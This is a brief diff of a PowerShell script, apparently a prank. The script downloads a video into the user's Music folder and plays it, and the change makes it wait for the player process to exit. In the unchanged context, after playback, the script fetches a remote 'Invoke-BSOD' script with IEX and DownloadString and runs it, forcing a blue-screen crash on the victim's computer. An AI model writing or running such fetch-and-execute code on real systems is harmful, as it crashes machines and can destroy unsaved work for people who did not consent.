@@ -20,7 +20,10 @@ Set-Location -Path $env:USERPROFILE\Music
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/YeetTheAnson/vineboom/main/NiceComputer.mp4" -OutFile "NiceComputer.mp4"
 
 # Play the video
-Start-Process -FilePath "NiceComputer.mp4" -Wait
+$process = Start-Process -FilePath "NiceComputer.mp4" -PassThru
+
+# Wait for the video player process to finish
+$process.WaitForExit()
 
 # Run the next part of the script after video playback
 IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD
